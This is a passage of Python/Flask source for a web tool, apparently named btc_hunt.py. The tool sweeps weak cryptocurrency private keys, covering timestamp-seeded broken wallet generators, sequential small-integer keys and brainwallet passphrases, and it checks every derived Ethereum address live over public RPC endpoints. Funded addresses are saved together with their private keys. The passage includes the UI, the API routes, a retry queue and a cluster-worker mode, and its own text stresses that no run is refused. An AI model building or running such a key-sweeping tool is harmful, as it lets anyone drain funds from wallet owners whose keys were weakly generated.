        info["ms"] = round((time.monotonic() - t0) * 1000)
        if r.status_code != 200:
            info["error"] = "HTTP %d" % r.status_code
            return info
        d = r.json()
        if not (isinstance(d, dict) and d.get("result")):
            info["error"] = json.dumps(d)[:160]
            return info
        info["ok"] = True
        info["block"] = int(d["result"], 16)
        t1 = time.monotonic()
        r2 = requests.post(base, json=[
            {"jsonrpc": "2.0", "id": "a", "method": "eth_blockNumber",
             "params": []},
            {"jsonrpc": "2.0", "id": "b", "method": "eth_getBalance",
             "params": ["0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf",
                       "latest"]}],
            timeout=min(12.0, ETH_RPC_TIMEOUT), headers=_eth_headers())
        info["batch"] = r2.status_code == 200 and isinstance(r2.json(), list)
        info["batch_ms"] = round((time.monotonic() - t1) * 1000)
        if not info["batch"]:
            _ETH_BATCH_OK[base] = False
    except Exception as e:
        info["ms"] = round((time.monotonic() - t0) * 1000)
        info["error"] = str(e)[:200]
    return info


@app.route("/eth")
def eth_page():
    # ── recipe widget (shared by the era batch and the manual sweep) ──────
    rec = []
    for rid, r in ETH_RECIPES.items():
        rec.append(
            "<label class='rec%s' data-units='%s' data-rid='%s'>"
            "<input type='checkbox' name='eth_recipe' value='%s'%s>"
            "<b>%s</b> <span class='pill info'>%s</span>"
            "<div class='muted'>%s</div></label>" % (
                " sel" if r["default"] else "",
                html.escape(",".join(r["units"])), html.escape(rid),
                html.escape(rid), " checked" if r["default"] else "",
                html.escape(r["label"]), html.escape("/".join(r["units"])),
                html.escape(r["note"])))

    # ── era widget rows ───────────────────────────────────────────────────
    eras = []
    for e in ETH_ERAS:
        span = e["end"] - e["start"] + 1
        if not e.get("scannable", True):
            warn = "<span class='pill bad'>%s</span>" % html.escape(e["warn"])
        elif e.get("warn"):
            warn = "<span class='pill warn'>%s</span>" % html.escape(e["warn"])
        else:
            warn = "<span class='pill ok'>timestamp-seeded — scannable</span>"
        eras.append(
            "<div class='era%s' id='era-%s'>"
            "<input type='checkbox' class='erack' id='ck-%s' value='%s'%s "
            "onchange='eraToggle()'>"
            "<div>"
            "<div class='nn'>%s · unit %s · <b>%s</b> timestamps wide</div>"
            "<div class='tt'>%s</div>"
            "<div class='win'>%s &nbsp;·&nbsp; %s → %s</div>"
            "<div>%s</div>"
            "<div class='ctl'>"
            "<div><label>steps for this era</label>"
            "<input id='st-%s' value='%d' oninput='eraTotal()'></div>"
            "<div><label>offset into the era</label>"
            "<input id='of-%s' value='0' oninput='eraTotal()'></div>"
            "<div><label>load into manual sweep</label>"
            "<button class='btn ghost sm' onclick=\"eraManual('%s')\">"
            "↳ manual fields</button>"
            "<button class='btn ghost sm' onclick=\"eraWhole('%s')\">"
            "whole era</button></div>"
            "</div>"
            "<details><summary>what this window can and cannot find</summary>"
            "<div class='muted'>%s</div></details>"
            "</div></div>" % (
                "" if e["default"] else " off", html.escape(e["id"]),
                html.escape(e["id"]), html.escape(e["id"]),
                " checked" if e["default"] else "",
                html.escape(e["era"]), html.escape(e["unit"]),
                format(span, ","), html.escape(e["label"]),
                html.escape(e["window"]), format(e["start"], ","),
                format(e["end"], ","), warn,
                html.escape(e["id"]), ETH_ERA_STEPS, html.escape(e["id"]),
                html.escape(e["id"]), html.escape(e["id"]),
                html.escape(e["note"])))

    # ── quick presets for the manual sweep ────────────────────────────────
    presets = []
    for p in ETH_ERAS:
        presets.append(
            "<button class='btn ghost sm' onclick=\"preset('%s','%s',%d,%d)\" "
            "title='%s — loads into Start/End/Unit below'>%s · %s</button>" % (
                p["id"], p["unit"], p["start"], p["end"],
                html.escape(p["window"]), html.escape(p["era"]),
                html.escape(p["label"])))

    body = """
<div class="card accent-green" id="era"><h2>1 · Era batch — fixed windows
<span class="tag">one job, eras in sequence</span></h2>
<p class="muted">The documented weak-key eras, as fixed scan values. Tick the
eras you want, give each one a <b>steps</b> budget (how many timestamps to take,
from <b>offset</b> steps into the window), pick the recipes below, and press
<b>Start era batch</b>. All selected eras run inside <b>one</b> job, one after
another: the RPC endpoint — not the CPU — is the bottleneck, so parallel era
jobs would only multiply 429s, and one job means one progress bar, one Stop
button and one retry queue.</p>
<p class="muted"><b>Be honest with yourself about scale.</b> Era 1 is
{span1} timestamps wide, Era 2 {span2} and Era 3 {span3}. A batch run takes
<i>steps</i> from each era, not the whole era: the default {erasteps} steps per
era is one timestamp in {ratio3} of Era 3 ({cover3}%). <b>Nothing here is
refused:</b> ask for a whole era and it runs — split into batches of {maxsteps}
timestamps that go one after another, each logging <code>chunk i/N</code>, with
Stop honoured between batches and everything found so far kept. What the number
buys you is time, not permission: the whole of Era 3 is <b>{days3} days of pure
CPU</b> at ~{rate} candidates/s and <b>{reqs3} batch requests</b> — about
{rpcyears3} years at a sustainable 5 requests/s from a public endpoint. Past
{maxtotal} steps (<code>ETH_MAX_TOTAL_STEPS</code>) the reply and the log say so
in wall-clock terms instead of blocking the run. Use <b>steps</b> to size a
sample and <b>offset</b> to walk an era run by run: <code>offset + steps</code>
is where the next run starts.</p>
<div class="eras">{eras}</div>
<div class="row">
<button class="btn go" onclick="startEra()">▶ Start era batch</button>
<button class="btn danger" onclick="stop('eth_era')">■ Stop</button>
<button class="btn ghost sm" onclick="selScannable()">select scannable</button>
<button class="btn ghost sm" onclick="clearEras()">clear</button>
<button class="btn ghost sm" onclick="allSteps({erasteps})">steps = {erasteps}</button>
<span id="eraTotal" class="pill ok">0 steps total</span>
<span class="tiny">no cap — batches of {maxsteps} (<code>ETH_MAX_STEPS</code>),
run in order; <code>ETH_MAX_TOTAL_STEPS</code>={maxtotal} is only where the ETA
note kicks in</span>
</div>
<div class="bar"><div id="barEra" style="width:0%"></div></div>
<p id="detailEra" class="muted"></p><pre id="logEra"></pre>
</div>

<div class="card"><h2>2 · Recipes — what a timestamp is fed into
<span class="tag">shared by every ETH run</span></h2>
<p class="muted">A timestamp is a <b>seed for a broken generator, never a private
key</b>. Each recipe reproduces one specific generator and declares the unit it
was fed; the era batch filters them per era automatically (Era 1–3 are
milliseconds, the Trust Wallet window is seconds), and the manual sweep dims the
ones that do not accept its unit.</p>
<div class="recipes">{recipes}</div>
</div>

<div class="card" id="manualcard"><h2>3 · Manual timestamp sweep
<span class="tag">any range, any unit</span></h2>
<p class="muted">Same curve as Bitcoin (secp256k1), Keccak-256 addresses, and
<b>no bloom filter</b>: every derived address is checked live over JSON-RPC,
batched {batch} addresses ({calls} calls) per request. Use this for a range that
is not one of the fixed eras, or after loading an era with
<b>↳ manual fields</b>.</p>
<div class="inline">
<div><label>Unit</label>
<select id="unit" onchange="unitChanged()">
<option value="s">seconds</option>
<option value="ms">milliseconds</option>
</select></div>
<div><label>Start</label><input id="s" value="1669248000"></div>
<div><label>End</label><input id="e" value="1671753599"></div>
</div>
<p class="row">{presets}</p>
<p class="muted"><b>Any range is accepted.</b> A run wider than {maxsteps} steps
is split into batches of at most {maxsteps} (<code>ETH_MAX_STEPS</code>) and the
batches run one after another — the log prints <code>chunk i/N</code> for each,
Stop is honoured between and inside batches, and everything found so far is
kept. Above {maxtotal} steps the start reply adds the batch count and an
honest wall-clock estimate.</p>
<div class="row">
<button class="btn go" onclick="startTs()">▶ Start</button>
<button class="btn danger" onclick="stop('eth_ts')">■ Stop</button>
</div>
<div class="bar"><div id="barTs" style="width:0%"></div></div>
<p id="detailTs" class="muted"></p><pre id="logTs"></pre>
</div>

<div class="card accent-red"><h2>4 · Weak &amp; sequential keys
<span class="tag">the ethercombing vector</span></h2>
<p class="muted">The 2015–2016 "ethercombing" drain used private keys that are
<b>small integers</b> (1, 2, 3, …) or trivial values — no timestamp involved, and
it is the only Ethereum vector on this page known to have actually paid out.
Sequential keys cost one derivation each (~{weakrate}/s with native Keccak), so
100,000 keys is about a minute of work plus RPC time.</p>
<div class="inline">
<div><label>Sequential keys to try (1..N)</label><input id="n" value="10000"></div>
</div>
<label>Extra private keys (one hex per line, optional)</label>
<textarea id="keys" rows="4" placeholder="0x1&#10;deadbeef…"></textarea>
<div class="row">
<button class="btn go" onclick="startWk()">▶ Start</button>
<button class="btn danger" onclick="stop('eth_weak')">■ Stop</button>
</div>
<div class="bar"><div id="barWk" style="width:0%"></div></div>
<p id="detailWk" class="muted"></p><pre id="logWk"></pre>
</div>

<div class="card"><h2>5 · RPC endpoints <span class="tag">the real
bottleneck</span></h2>
<p class="muted">Balances come from {bases}. Every run starts with a
<b>pre-flight probe</b> of those endpoints and uses only the ones that answer:
public endpoints reject datacenter traffic with HTTP 403 about as readily as
they rate-limit it. A 429/5xx parks that endpoint and fails over to the next; a
401/403 parks it for {deadcool}s; and if <b>every</b> endpoint refuses, the run
<b>stops</b> instead of deriving candidates nobody can check. Batches start at
{batch} addresses ({calls} calls) and halve automatically when an endpoint
refuses arrays or a large batch. Set <code>ETH_RPC_URLS</code> to your own node —
that is the only way to sweep millions of candidates quickly. Test them
first:</p>
<div class="row"><button class="btn" onclick="pingRpc()">⇄ Test RPC</button>
<span class="tiny">eth_blockNumber + a small batch probe per endpoint</span></div>
<pre id="rpc">not tested</pre>
<p class="muted">EC backend: <span class="pill info">{ec}</span> Keccak:
<span class="pill info">{hashb}</span> min balance to save:
<span class="pill info">{minwei} wei</span> batch now:
<span class="pill info"><span id="batchNow">{batch}</span> addresses</span>
endpoints: <span id="rpcState">{rpcstate}</span> · saved hits are re-checked on
<a href="/results">/results</a> (Check ETH balances)</p>
</div>

<div class="card"><h2>6 · Queued candidates <span class="tag">never
dropped</span></h2>
<p class="muted">A batch that cannot be checked — throttled, refused, or caught
by a Stop mid-run — is <b>appended to <code>{pendingfile}</code> instead of
being thrown away</b>. Derivation is the expensive part (up to ~2.7 ms per
candidate), so the queue keeps address, private key, recipe and timestamp: a
re-check needs no re-derivation and a funded address is saved with exactly the
payload a live sweep would have produced. <b><span
id="pendingN">{pendingn}</span></b> candidate(s) are queued now (cap
{pendingmax}, <code>ETH_PENDING_MAX</code>; beyond it, candidates are counted as
dropped and the log says so).</p>
<div class="row">
<button class="btn gold" onclick="retryQueued()">↻ Re-check queued
candidates</button>
<button class="btn danger" onclick="stop('eth_retry')">■ Stop</button>
<button class="btn ghost sm" onclick="refreshPending()">refresh count</button>
</div>
<div class="bar"><div id="barQ" style="width:0%"></div></div>
<p id="detailQ" class="muted"></p><pre id="logQ"></pre>
</div>
<script>
const ERAS={eras_json};
const CAP={maxtotal_raw};      // warn threshold only — nothing is refused
const BATCH={maxsteps_raw};    // ETH_MAX_STEPS: timestamps per batch
const NL=String.fromCharCode(10);
function fmt(n){ return (n||0).toLocaleString('en-US'); }
function $(id){ return document.getElementById(id); }
function each(sel,fn){ Array.prototype.slice.call(document.querySelectorAll(sel)).forEach(fn); }
function eraToggle(){
  each('.erack',function(c){
    const row=$('era-'+c.value);
    if(row){ row.classList.toggle('on',c.checked); row.classList.toggle('off',!c.checked); }
  });
  eraTotal();
}
function eraTotal(){
  let sum=0;
  each('.erack:checked',function(c){
    sum += parseInt(($('st-'+c.value)||{}).value||'0',10)||0;
  });
  const el=$('eraTotal');
  if(el){
    const n=sum?Math.max(1,Math.ceil(sum/BATCH)):0;
    el.textContent=sum?(fmt(sum)+' steps total · '+fmt(n)+' batches'+
      (sum>CAP?' · long run':'')):'0 steps total';
    el.className='pill '+(sum?(sum>CAP?'warn':'ok'):'warn');
  }
}
function allSteps(n){
  each('.erack',function(c){ const el=$('st-'+c.value); if(el) el.value=n; });
  eraTotal();
}
function selScannable(){
  each('.erack',function(c){
    const e=ERAS[c.value]; c.checked = !!(e && e.scannable);
  });
  eraToggle();
}
function clearEras(){ each('.erack',function(c){ c.checked=false; }); eraToggle(); }
function eraWhole(id){
  const e=ERAS[id]; if(!e) return;
  const el=$('st-'+id); if(el) el.value=e.span;
  eraTotal();
  const n=Math.max(1,Math.ceil(e.span/BATCH));
  notify('whole '+e.era+' = '+fmt(e.span)+' steps = '+fmt(n)+' batches of '+
    fmt(BATCH)+', run in order'+(e.span>CAP?' — that is a very long run; Stop any time and everything found is kept':''),
    true);
}
function eraManual(id){
  const e=ERAS[id]; if(!e) return;
  $('unit').value=e.unit; $('s').value=e.start; $('e').value=e.end;
  each('input[name=eth_recipe]',function(c){
    const units=((c.parentNode.getAttribute('data-units'))||'').split(',');
    if(e.recipes.indexOf(c.value)>=0 && units.indexOf(e.unit)>=0) c.checked=true;
  });
  recSel(); unitChanged();
  const card=$('manualcard');
  if(card) card.scrollIntoView({behavior:'smooth',block:'start'});
  notify(e.era+' ('+id+') loaded into the manual sweep — unit '+e.unit, true);
}
function preset(id,unit,s,e){
  $('unit').value=unit; $('s').value=s; $('e').value=e; unitChanged();
  const card=$('manualcard');
  if(card) card.scrollIntoView({behavior:'smooth',block:'start'});
}
function unitChanged(){
  const u=$('unit').value;
  each('label.rec',function(l){
    const units=(l.getAttribute('data-units')||'').split(',');
    l.classList.toggle('dim', units.indexOf(u)<0);
  });
}
function recSel(){
  each('label.rec',function(l){
    const box=l.querySelector('input');
    l.classList.toggle('sel', !!(box && box.checked));
  });
}
function recipes(){
  return Array.prototype.slice.call(
    document.querySelectorAll('input[name=eth_recipe]:checked'))
    .map(function(b){return b.value;});
}
function startEra(){
  const eras=[];
  each('.erack:checked',function(c){
    eras.push({id:c.value,
      steps:(($('st-'+c.value)||{}).value||'').trim(),
      offset:(($('of-'+c.value)||{}).value||'').trim()});
  });
  if(!eras.length){ notify('tick at least one era',false); return; }
  const r=recipes();
  if(!r.length){ notify('pick at least one recipe',false); return; }
  post('/api/eth/era',{eras:eras,recipes:r});
}
function startTs(){
  const r=recipes();
  if(!r.length){ notify('pick at least one recipe',false); return; }
  post('/api/eth/timestamp',{start:$('s').value, end:$('e').value,
    unit:$('unit').value, recipes:r});
}
function startWk(){
  post('/api/eth/weakkeys',{count:$('n').value, keys:$('keys').value});
}
function pingRpc(){
  $('rpc').textContent='testing…';
  post('/api/eth/ping',{}).then(function(d){
    const el=$('rpc'); if(!el) return;
    el.textContent=(d.bases||[]).map(function(b){
      return (b.ok?'ok  ':'FAIL')+' '+b.host+'  block='+b.block+
             '  batch='+(b.batch?'yes':'no')+'  '+b.ms+'ms'+
             (b.error?'  '+b.error:'');
    }).join(NL) || 'no endpoints configured';
  });
}
function retryQueued(){ post('/api/eth/retry',{}); }
function refreshPending(){
  fetch('/api/eth/pending',{cache:'no-store'})
    .then(function(r){ return r.json(); })
    .then(function(d){
      const n=$('pendingN'); if(n) n.textContent=fmt(d.queued);
      const bn=$('batchNow'); if(bn) bn.textContent=d.batch_size||'';
      const st=$('rpcState'); if(st) st.textContent=d.rpc||'';
      const dq=$('detailQ');
      if(dq) dq.textContent=d.queued
        ? fmt(d.queued)+' candidate(s) queued in '+d.file : 'queue empty ('+d.file+')';
      const lq=$('logQ');
      if(lq && !lq.textContent && d.sample && d.sample.length){
        lq.textContent='next queued: '+d.sample.join(', ');
      }
    }).catch(function(){});
}
each('input[name=eth_recipe]',function(c){
  c.addEventListener('change', recSel);
});
eraToggle(); unitChanged(); recSel();
watch('eth_era','Era');
watch('eth_ts','Ts');
watch('eth_weak','Wk');
watch('eth_retry','Q');
refreshPending();
setInterval(refreshPending, 15000);
</script>"""
    e1, e2, e3 = (e["end"] - e["start"] + 1 for e in ETH_ERAS[:3])
    rate = 24000          # measured sha256_dec candidates/s, both accelerators
    body = (body
            .replace("{recipes}", "".join(rec))
            .replace("{eras}", "".join(eras))
            .replace("{presets}", "".join(presets))
            .replace("{eras_json}", json.dumps(
                {e["id"]: {"era": e["era"], "unit": e["unit"],
                           "start": e["start"], "end": e["end"],
                           "span": e["end"] - e["start"] + 1,
                           "recipes": list(e["recipes"]),
                           "scannable": e.get("scannable", True)}
                 for e in ETH_ERAS}))
            .replace("{maxtotal_raw}", str(ETH_MAX_TOTAL_STEPS))
            .replace("{maxsteps_raw}", str(ETH_MAX_STEPS))
            .replace("{span1}", format(e1, ","))
            .replace("{span2}", format(e2, ","))
            .replace("{span3}", format(e3, ","))
            # adaptive precision: a 1,000-step slice of Era 3 is 1.59e-05%, and
            # "%.4f" would print that as a dishonest-looking 0.0000%.
            .replace("{cover3}", ("%.4f" % (100.0 * ETH_ERA_STEPS / e3))
                     if 100.0 * ETH_ERA_STEPS / e3 >= 0.001
                     else ("%.3g" % (100.0 * ETH_ERA_STEPS / e3)))
            .replace("{ratio3}", format(max(1, int(e3 / ETH_ERA_STEPS)), ","))
            # 63.1e9 candidates at ~24k/s is weeks of CPU, but 1.26e9 batch
            # requests at a sustainable 5 req/s is years — the RPC is the wall.
            .replace("{days3}", "%.0f" % (e3 / rate / 86400))
            .replace("{reqs3}", "{:,}".format(int(e3 / ETH_RPC_BATCH)))
            .replace("{rpcyears3}", "%.0f"
                     % (e3 / ETH_RPC_BATCH / 5 / 86400 / 365))
            .replace("{rate}", format(rate, ","))
            .replace("{weakrate}", format(rate, ","))
            .replace("{erasteps}", format(ETH_ERA_STEPS, ","))
            .replace("{batch}", "{:,}".format(ETH_RPC_BATCH))
            .replace("{calls}", "{:,}".format(ETH_RPC_BATCH * 2))
            .replace("{maxtotal}", "{:,}".format(ETH_MAX_TOTAL_STEPS))
            .replace("{maxsteps}", "{:,}".format(ETH_MAX_STEPS))
            .replace("{bases}", html.escape(", ".join(
                x.split("//")[-1] for x in _ETH_RPC_BASES)))
            .replace("{rpcstate}", html.escape(_eth_status()))
            .replace("{deadcool}", "{:,.0f}".format(ETH_DEAD_COOL_SECS))
            .replace("{pendingfile}", html.escape(ETH_PENDING_FILE))
            .replace("{pendingmax}", "{:,}".format(ETH_PENDING_MAX)
                     if ETH_PENDING_MAX else "none")
            .replace("{pendingn}", "{:,}".format(_eth_pending_count()))
            .replace("{ec}", html.escape(EC_BACKEND))
            .replace("{hashb}", html.escape(ETH_HASH_BACKEND))
            .replace("{minwei}", "{:,}".format(ETH_MIN_WEI)))
    return page(body)


@app.route("/api/eth/recipes")
def api_eth_recipes():
    return {"recipes": [{"id": rid, "label": r["label"], "units": list(r["units"]),
                         "note": r["note"], "default": r["default"]}
                        for rid, r in ETH_RECIPES.items()],
            "presets": [_era_public(e) for e in ETH_ERAS],
            "eras": [_era_public(e) for e in ETH_ERAS],
            "era_steps": ETH_ERA_STEPS,
            "rpc_bases": [{"url": u, "host": _esplora_host(u)}
                          for u in _ETH_RPC_BASES],
            "rpc_status": _esplora_status(_ETH_RPC_BASES),
            "batch_addresses": ETH_RPC_BATCH,
            "batch_size_now": _eth_batch_size(),
            "preflight": ETH_PREFLIGHT,
            "rpc_rounds": ETH_RPC_ROUNDS,
            "dead_cool_secs": ETH_DEAD_COOL_SECS,
            "error_cool_secs": ETH_ERROR_COOL_SECS,
            "pending_queued": _eth_pending_count(),
            "pending_file": str(_eth_pending_path()),
            "pending_max": ETH_PENDING_MAX,
            "min_wei": ETH_MIN_WEI,
            "verify_balances": ETH_VERIFY_BALANCES,
            "max_steps": ETH_MAX_STEPS,
            "max_total_steps": ETH_MAX_TOTAL_STEPS,
            "max_weak_keys": ETH_MAX_WEAK_KEYS,
            "ec_backend": EC_BACKEND,
            "hash_backend": ETH_HASH_BACKEND,
            "wordlist": str(BIP39_WORDLIST_PATH)}


def _era_public(e):
    """One era as the UI/API sees it (span computed, nothing internal)."""
    return {"id": e["id"], "era": e["era"], "label": e["label"],
            "window": e["window"], "unit": e["unit"], "start": e["start"],
            "end": e["end"], "span": e["end"] - e["start"] + 1,
            "recipes": list(e["recipes"]), "default": e["default"],
            "scannable": e.get("scannable", True), "warn": e.get("warn", ""),
            "note": e["note"], "default_steps": ETH_ERA_STEPS}


@app.route("/api/eth/eras")
def api_eth_eras():
    """The fixed era windows, with their honesty notes and default slice."""
    return {"ok": True, "eras": [_era_public(e) for e in ETH_ERAS],
            "era_steps": ETH_ERA_STEPS,
            "max_total_steps": ETH_MAX_TOTAL_STEPS,
            "max_steps_per_run": ETH_MAX_STEPS,
            "recipes": [{"id": r, "label": v["label"], "units": list(v["units"])}
                        for r, v in ETH_RECIPES.items()]}


@app.route("/api/eth/era", methods=["POST"])
def api_eth_era():
    """Start ONE job that sweeps several era windows in sequence.

    Accepts either {"eras": ["frontier","cryptojs"], "steps": N, "offset": M}
    or a per-era list {"eras": [{"id": ..., "steps": ..., "offset": ...}]}.
    """
    j = request.get_json(silent=True) or {}
    raw = j.get("eras") or []
    if not isinstance(raw, list):
        raw = [raw]
    try:
        g_steps = int(str(j.get("steps") or ETH_ERA_STEPS).replace(",", ""))
        g_offset = int(str(j.get("offset") or 0).replace(",", ""))
    except (TypeError, ValueError):
        return {"ok": False, "msg": "steps and offset must be integers"}
    specs = []
    for item in raw:
        if isinstance(item, dict):
            specs.append({"id": str(item.get("id") or ""),
                          "steps": item.get("steps") or g_steps,
                          "offset": item.get("offset") or g_offset})
        else:
            specs.append({"id": str(item), "steps": g_steps,
                          "offset": g_offset})
    by_id = {e["id"]: e for e in ETH_ERAS}
    unknown = [s["id"] for s in specs if s["id"] not in by_id]
    if unknown:
        return {"ok": False,
                "msg": "unknown era(s): %s — available: %s"
                       % (", ".join(unknown), ", ".join(by_id))}
    if not specs:
        return {"ok": False, "msg": "select at least one era"}
    try:
        for s in specs:
            s["steps"] = max(1, int(str(s["steps"]).replace(",", "")))
            s["offset"] = max(0, int(str(s["offset"]).replace(",", "")))
    except (TypeError, ValueError):
        return {"ok": False, "msg": "steps and offset must be integers"}
    total = sum(s["steps"] for s in specs)
    ids = j.get("recipes") or []
    if not isinstance(ids, list):
        ids = [str(ids)]
    ids = [str(x) for x in ids if x in ETH_RECIPES]
    if not ids:
        return {"ok": False, "msg": "pick at least one recipe"}
    units = {by_id[s["id"]]["unit"] for s in specs}
    if not any(u in ETH_RECIPES[r]["units"] for u in units for r in ids):
        return {"ok": False,
                "msg": ("no selected recipe accepts the unit of any selected "
                        "era (%s)" % ", ".join(sorted(units)))}
    skipped = [by_id[s["id"]]["id"] for s in specs
               if not by_id[s["id"]].get("scannable", True)]
    ok, msg = _start_job("eth_era", attack_eth_eras, specs, ids)
    if ok and skipped:
        msg = ("%s — note: %s cannot be recovered by a private-key sweep and is "
               "scanned only to demonstrate that" % (msg, ", ".join(skipped)))
    if ok and total > ETH_MAX_STEPS:
        msg = "%s — %s" % (msg, _batch_note(
            total, ETH_MAX_STEPS, "steps",
            ETH_RATE / max(1, len(ids)) if total > ETH_MAX_TOTAL_STEPS else None))
    return {"ok": ok, "msg": msg, "eras": [s["id"] for s in specs],
            "recipes": ids, "steps": total,
            "batches": _batch_count(total, ETH_MAX_STEPS),
            "batch_steps": ETH_MAX_STEPS}


@app.route("/api/eth/timestamp", methods=["POST"])
def api_eth_timestamp():
    j = request.get_json(silent=True) or {}
    unit = str(j.get("unit") or "s").strip().lower()
    if unit not in ("ms", "s"):
        return {"ok": False, "msg": "unit must be 'ms' or 's'"}
    try:
        start, end = int(j["start"]), int(j["end"])
    except (KeyError, TypeError, ValueError):
        return {"ok": False, "msg": "start and end must be integer timestamps"}
    if end < start:
        return {"ok": False, "msg": "end must be >= start"}
    span = end - start + 1
    ids = j.get("recipes") or []
    if not isinstance(ids, list):
        ids = [str(ids)]
    ids = [str(x) for x in ids]
    usable = [r for r in ids if r in ETH_RECIPES and unit in ETH_RECIPES[r]["units"]]
    if not usable:
        return {"ok": False,
                "msg": ("no selected recipe accepts unit=%s — pick one of: %s"
                        % (unit, ", ".join(
                            r for r in ETH_RECIPES
                            if unit in ETH_RECIPES[r]["units"])))}
    ok, msg = _start_job("eth_ts", attack_eth_timestamp, start, end, unit, usable)
    if ok and span > ETH_MAX_STEPS:
        # Accepted, not refused: the sweep splits into batches of ETH_MAX_STEPS
        # and runs them in order. Past ETH_MAX_TOTAL_STEPS the note also carries
        # the wall-clock estimate, since that is the part people misjudge.
        msg = "%s — %s" % (msg, _batch_note(
            span, ETH_MAX_STEPS, "steps",
            ETH_RATE / max(1, len(usable)) if span > ETH_MAX_TOTAL_STEPS
            else None))
    return {"ok": ok, "msg": msg, "recipes": usable, "span": span,
            "batches": _batch_count(span, ETH_MAX_STEPS),
            "batch_steps": ETH_MAX_STEPS}


@app.route("/api/eth/weakkeys", methods=["POST"])
def api_eth_weakkeys():
    j = request.get_json(silent=True) or {}
    try:
        count = int(str(j.get("count") or 0).replace(",", "").strip() or 0)
    except ValueError:
        return {"ok": False, "msg": "count must be an integer"}
    raw = j.get("keys") or ""
    if isinstance(raw, list):
        lines = [str(x) for x in raw]
    else:
        lines = str(raw).splitlines()
    lines = [x.strip() for x in lines if x and x.strip()]
    if count < 0:
        return {"ok": False, "msg": "count must be >= 0"}
    if count + len(lines) == 0:
        return {"ok": False, "msg": "set a count or paste some keys"}
    ok, msg = _start_job("eth_weak", attack_eth_weakkeys, count, lines)
    if ok and count + len(lines) > ETH_MAX_WEAK_KEYS:
        # Not refused: keys are streamed and flushed one RPC batch at a time, so
        # a huge count simply runs longer. Past the warn threshold, say how long.
        msg = ("%s — %s keys is past ETH_MAX_WEAK_KEYS=%s: they are checked one "
               "RPC batch at a time, ≈%s at %s keys/s, and Stop keeps every hit"
               % (msg, format(count + len(lines), ","),
                  format(ETH_MAX_WEAK_KEYS, ","),
                  _human_secs((count + len(lines)) / ETH_RATE),
                  format(ETH_RATE, ",")))
    return {"ok": ok, "msg": msg, "keys": count + len(lines)}


@app.route("/api/eth/ping", methods=["POST", "GET"])
def api_eth_ping():
    """Probe every configured RPC base (parallel, ~1 s each)."""
    with ThreadPoolExecutor(max_workers=min(4, max(1, len(_ETH_RPC_BASES)))) as ex:
        bases = list(ex.map(_eth_ping_base, _ETH_RPC_BASES))
    ok = sum(1 for x in bases if x["ok"])
    return {"ok": ok > 0, "msg": "%d/%d endpoint(s) answered" % (ok, len(bases)),
            "bases": bases, "batch_addresses": ETH_RPC_BATCH}


@app.route("/api/eth/pending")
def api_eth_pending():
    """How many candidates are waiting for a working RPC endpoint."""
    return {"ok": True, "queued": _eth_pending_count(),
            "file": str(_eth_pending_path()), "cap": ETH_PENDING_MAX,
            "sample": [r.get("address") for r in _eth_pending_read(5)],
            "batch_size": _eth_batch_size(), "rpc": _eth_status(),
            "rpc_bases": [{"url": u, "host": _eth_host(u)} for u in _ETH_RPC_BASES],
            "active_bases": [{"url": u, "host": _eth_host(u)} for u in _eth_bases()],
            "preflight": ETH_PREFLIGHT}


@app.route("/api/eth/retry", methods=["POST"])
def api_eth_retry():
    """Drain eth_pending.jsonl: re-check queued candidates, save the hits."""
    if not _eth_pending_count():
        return {"ok": False, "msg": "nothing queued — %s is empty"
                % _eth_pending_path().name}
    ok, msg = _start_job("eth_retry", retry_eth_pending)
    return {"ok": ok, "msg": msg}


@app.route("/api/eth/verify", methods=["POST"])
def api_eth_verify():
    """Re-check saved ETH hits over RPC (batched, stoppable, retried)."""
    ok, msg = _start_job("eth_verify", verify_eth_balances, False)
    return {"ok": ok, "msg": msg}

if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        epilog="worker mode (for cluster nodes): "
               "python btc_hunt.py --worker randstorm --shard 3/10   "
               "# timestamps split across 10 nodes\n"
               "python btc_hunt.py --worker brainwallet --shard 3/10 --wordlist words.txt")
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--build-bloom", action="store_true")
    ap.add_argument("--cli-randstorm", nargs=2, type=int, metavar=("START","END"))
    ap.add_argument("--cli-eth", nargs=2, type=int, metavar=("START","END"),
                    help="headless Ethereum timestamp sweep (no bloom needed)")
    ap.add_argument("--unit", choices=["s", "ms"], default="s",
                    help="timestamp unit for --cli-eth")
    ap.add_argument("--recipes", default="sha256_dec",
                    help="comma-separated ETH recipes for --cli-eth, e.g. "
                         "tw_bip39_s,sha256_dec")
    ap.add_argument("--cli-eth-era", metavar="ERA[:STEPS[@OFFSET]][,…]",
                    help="headless era batch: sweep several fixed windows in "
                         "sequence, e.g. frontier:50000,cryptojs:50000@2000000 "
                         "(available eras: %s)"
                         % ", ".join(e["id"] for e in ETH_ERAS))
    ap.add_argument("--steps", type=int, default=ETH_ERA_STEPS,
                    help="default per-era steps for --cli-eth-era")
    ap.add_argument("--list-eras", action="store_true",
                    help="print the fixed era windows and exit")
    ap.add_argument("--worker", choices=["randstorm", "brainwallet"],
                    help="run a single shard of an attack and exit (cluster worker mode)")
    ap.add_argument("--shard", metavar="IDX/N", help="0-based shard index / total shards, e.g. 3/10")
    ap.add_argument("--wordlist", help="passphrase file for --worker brainwallet")
    args = ap.parse_args()

    if args.build_bloom:
        build_bloom(print); sys.exit(0)

    if args.cli_randstorm:
        if not BLOOM_PATH.exists():
            sys.exit("run --build-bloom first")
        bf = BloomFilter.load(BLOOM_PATH)
        attack_randstorm(args.cli_randstorm[0], args.cli_randstorm[1],
                         bf, print, {"stop": False, "progress": 0, "detail": ""})
        sys.exit(0)

    if args.list_eras:
        for e in ETH_ERAS:
            print("%-9s %-7s %-4s %20d .. %-20d  %15s wide  %s%s"
                  % (e["id"], e["era"], e["unit"], e["start"], e["end"],
                     format(e["end"] - e["start"] + 1, ","), e["window"],
                     "" if e.get("scannable", True)
                     else "  [NOT recoverable by a privkey sweep]"))
            print("           %s" % e["note"])
        print("default per-era steps: %s (ETH_ERA_STEPS)  batch size: %s "
              "(ETH_MAX_STEPS)  warn above: %s (ETH_MAX_TOTAL_STEPS — nothing is "
              "refused, large runs just take more batches)"
              % (format(ETH_ERA_STEPS, ","), format(ETH_MAX_STEPS, ","),
                 format(ETH_MAX_TOTAL_STEPS, ",")))
        sys.exit(0)

    if args.cli_eth_era:
        job = {"stop": False, "progress": 0, "detail": ""}
        ids = [r.strip() for r in args.recipes.split(",") if r.strip()]
        bad = [r for r in ids if r not in ETH_RECIPES]
        if bad:
            sys.exit("unknown recipe(s): %s — available: %s"
                     % (", ".join(bad), ", ".join(ETH_RECIPES)))
